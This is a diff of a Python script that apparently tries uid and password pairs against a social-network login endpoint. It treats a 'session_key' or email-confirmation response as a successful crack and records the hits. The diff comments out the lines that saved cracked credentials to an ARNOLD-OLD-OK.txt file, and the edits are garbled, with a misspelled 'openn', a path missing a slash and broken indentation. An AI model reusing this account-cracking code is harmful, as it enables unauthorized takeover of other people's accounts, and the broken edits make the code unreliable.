@@ -318,12 +318,12 @@ def login(uid, tl):
             rp = requests.get(url, headers=headers).json()
             if "session_key" in rp:
                 print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
-                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
+                #open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in str(rp):
                 print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
-                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
+                #openn("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                 oks.append(uid)
                 break
             else:
@@ -399,12 +399,12 @@ def login1(uid, tl):
                     lin()
                 except(KeyError, IOError):
                     pass
-                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
+               #openn("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                 oks.append(uid)
                 break 
             elif "Please Confirm Email" in str(rp):
                 print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
-                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
+               #openn("/sdcardARNOLD-OLD-OKK.txt", "a").write(uid + "|" + pw + "\n")
                 oks.append(uid)
                 break
             else:
@@ -419,3 +419,4 @@ def login1(uid, tl):
 main()
 
 #----------------------------[CODE/END]-----------------------------------#
+
